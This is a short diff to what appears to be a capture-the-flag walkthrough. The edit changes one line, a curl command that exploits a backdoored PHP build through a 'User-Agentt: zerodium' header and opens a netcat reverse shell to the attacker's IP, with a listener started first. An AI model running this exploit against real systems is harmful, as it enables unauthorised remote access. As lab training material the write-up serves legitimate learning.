@@ -25,4 +25,4 @@ The quickest way to get a reverse shell, is to use a cURL request. replace `YOUR
 
 `nc -nvlp 4444`
 
-`curl http://10.10.10.242/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f ');"`
+`curl http://10.10.10.242/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f');"`
